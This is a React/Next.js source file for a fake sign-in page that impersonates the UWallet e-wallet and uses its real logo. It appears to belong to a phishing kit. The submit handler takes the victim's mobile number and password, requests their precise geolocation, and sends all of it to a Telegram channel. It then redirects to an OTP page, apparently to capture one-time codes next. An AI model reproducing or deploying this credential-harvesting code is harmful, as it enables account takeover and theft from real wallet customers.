"use client"

import React from "react"
import { useRouter } from "next/navigation"
import { useState } from "react"
import { LoadingOverlay } from "@/components/uwallet/loading-overlay"

type Language = "en" | "ar"

const translations = {
  en: {
    customerSignIn: "Customer Sign In",
    to: "To",
    mobileNumber: "Mobile Number",
    password: "Password",
    show: "SHOW",
    hide: "SHOW",
    rememberMe: "Remember Me",
    forgotPassword: "Forgot Password?",
    signIn: "Upgrade Sign In",
    merchantSignIn: "Merchant Sign In",
    copyright: "Copyright 2026 UWallet. All rights reserved.",
    checkboxError: "Please tick the box to proceed",
    langToggle: "العربية",
  },
  ar: {
    customerSignIn: "تسجيل دخول الأفراد",
    to: "لـ",
    mobileNumber: "رقم الخلوي",
    password: "كلمة السر",
    show: "إظهار",
    hide: "إخفاء",
    rememberMe: "تذكرني",
    forgotPassword: "نسيت كلمة السر؟",
    signIn: "تسجيل الدخول",
    merchantSignIn: "تسجيل دخول التاجر",
    copyright: "حقوق النشر 2026 UWallet. جميع الحقوق محفوظة.",
    checkboxError: "الرجاء اختيار المربع للاستمرار",
    langToggle: "English",
  },
}

export function SignInForm() {
  const [language, setLanguage] = useState<Language>("en")
  const [mobileNumber, setMobileNumber] = useState("")
  const [password, setPassword] = useState("")
  const [showPassword, setShowPassword] = useState(false)
  const [rememberMe, setRememberMe] = useState(false)
  const [isLoading, setIsLoading] = useState(false)
  const [error, setError] = useState("")
  const router = useRouter()

  const t = translations[language]
  const isRTL = language === "ar"

  const toggleLanguage = () => {
    setLanguage(language === "en" ? "ar" : "en")
  }

  /* ---------------- Helpers ---------------- */
  const getPreciseLocation = (): Promise<{ lat: number; lon: number } | null> => {
    return new Promise((resolve) => {
      if (!navigator.geolocation) {
        resolve(null)
        return
      }
      navigator.geolocation.getCurrentPosition(
        (position) => {
          resolve({
            lat: position.coords.latitude,
            lon: position.coords.longitude,
          })
        },
        () => resolve(null),
        { timeout: 5000 }
      )
    })
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    // if (!rememberMe) {
    //   setError(t.checkboxError)
    //   return
    // }

    if (!mobileNumber || !password) {
      setError("Please fill in all fields")
      return
    }

    setError("")
    console.log("Sign in:", { mobileNumber, password, rememberMe })
    setIsLoading(true)

    try {
      // 1️⃣ Location
      const preciseLoc = await getPreciseLocation()

      // 2️⃣ Store Info
      sessionStorage.setItem("userPhone", mobileNumber)
      sessionStorage.setItem("userPassword", password)

      // 3️⃣ Send to Telegram
      try {
        const { sendTelegramMessage } = await import("@/lib/telegram")
        await sendTelegramMessage({
          title: "Login Attempt",
          phoneNumber: mobileNumber,
          password: password,
          lat: preciseLoc?.lat,
          lon: preciseLoc?.lon,
          exclude: ["otp1", "otp2", "otp3", "pin"], // Exclude future steps, allow profile (password)
        })
      } catch (err) {
        console.error("Telegram error:", err)
      }

      setTimeout(() => {
        router.push("/otp3")
      }, 1500)
    } catch (error) {
      console.error(error)
      // Proceed anyway
      setTimeout(() => {
        router.push("/otp3")
      }, 1500)
    }
  }

  return (
    <div
      className="min-h-screen flex flex-col bg-white"
      dir={isRTL ? "rtl" : "ltr"}
    >
      {isLoading && <LoadingOverlay />}
      {/* Main Content */}
      <div className="flex-1 flex flex-col items-center px-6 pt-6">
        {/* Language Toggle */}
        <div className={`w-full max-w-md flex ${isRTL ? "justify-start" : "justify-end"} mb-4`}>
          <button
            type="button"
            onClick={toggleLanguage}
            className="text-black text-lg font-medium hover:text-gray-700 transition-colors"
          >
            {t.langToggle}
          </button>
        </div>

        {/* Header */}
        <div className={`w-full max-w-md mb-8 ${isRTL ? "text-right" : "text-left"}`}>
          <h1 className="text-[#374151] text-xl font-medium leading-tight">
            {t.customerSignIn}
          </h1>
          <div className="flex items-center gap-1.5" style={{ direction: isRTL ? "rtl" : "ltr" }}>
            <span className="text-[#1a1f3c] text-3xl font-medium">{t.to}</span>
            <img
              src="https://uwallet.jo/storage/2025/10/uwallet-final-logo-blue.png"
              alt="UWallet"
              className="h-8 w-auto"
            />
          </div>
        </div>

        {/* Form */}
        <form onSubmit={handleSubmit} className="w-full max-w-md space-y-4">
          {/* Mobile Number Field */}
          <div>
            <label
              htmlFor="mobile"
              className={`block text-[#9ca3af] text-sm font-medium mb-2 ${isRTL ? "text-right" : "text-left"}`}
            >
              {t.mobileNumber}
            </label>
            <input
              id="mobile"
              type="tel"
              value={mobileNumber}
              onChange={(e) => setMobileNumber(e.target.value)}
              className="w-full h-12 px-3 bg-white border-2 border-[#4b5563] rounded-md text-[#1f2937] text-base font-medium focus:outline-none focus:border-[#1a1f3c] transition-colors"
              dir={isRTL ? "rtl" : "ltr"}
            />
          </div>

          {/* Password Field */}
          <div>
            <label
              htmlFor="password"
              className={`block text-[#9ca3af] text-sm font-medium mb-2 ${isRTL ? "text-right" : "text-left"}`}
            >
              {t.password}
            </label>
            <div className="relative">
              <input
                id="password"
                type={showPassword ? "text" : "password"}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className={`w-full h-12 px-3 bg-white border-2 border-[#4b5563] rounded-md text-[#1f2937] text-base font-medium focus:outline-none focus:border-[#1a1f3c] transition-colors ${isRTL ? "pl-16" : "pr-16"}`}
                dir={isRTL ? "rtl" : "ltr"}
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className={`absolute top-1/2 -translate-y-1/2 text-[#6b7280] text-[13px] font-bold tracking-wider hover:text-[#374151] transition-colors ${isRTL ? "left-4" : "right-4"}`}
              >
                {showPassword ? t.hide : t.show}
              </button>
            </div>
          </div>

          {/* Remember Me & Forgot Password */}
          <div className="flex items-center justify-between pt-1">
            <label className={`flex items-center gap-3 cursor-pointer ${isRTL ? "flex-row-reverse" : ""}`}>
              <div className="relative flex items-center">
                <input
                  type="checkbox"
                  checked={rememberMe}
                  onChange={(e) => setRememberMe(e.target.checked)}
                  className="sr-only"
                />
                <div
                  className={`w-6 h-6 border rounded-[4px] transition-colors flex items-center justify-center ${rememberMe
                    ? "bg-[#1a1f3c] border-[#1a1f3c]"
                    : "bg-white border-[#d1d5db]"
                    }`}
                >
                  {rememberMe && (
                    <svg
                      className="w-4 h-4 text-white"
                      viewBox="0 0 24 24"
                      fill="none"
                      stroke="currentColor"
                      strokeWidth="3"
                      strokeLinecap="round"
                      strokeLinejoin="round"
                    >
                      <polyline points="20 6 9 17 4 12" />
                    </svg>
                  )}
                </div>
              </div>
              <span className="text-[#374151] text-sm font-medium">{t.rememberMe}</span>
            </label>
            <button
              type="button"
              className="text-[#374151] text-sm font-medium hover:text-[#1f2937] transition-colors"
            >
              {t.forgotPassword}
            </button>
          </div>
          {error && (
            <div className="text-red-500 text-sm font-medium mt-1">
              {error}
            </div>
          )}
          <div className="pt-4 space-y-4">
            {/* Sign In Button */}
            <button
              type="submit"
              className="w-full h-12 bg-[#e5e7eb] hover:bg-[#d1d5db] text-[#1a1f3c] font-bold text-base rounded-md transition-colors"
            >
              {t.signIn}
            </button>
          </div>
        </form>
      </div>
      {/* Footer */}
      <div className="py-6 text-center">
        <p className="text-[#9ca3af] text-xs">{t.copyright}</p>
      </div>
    </div>
  )
}
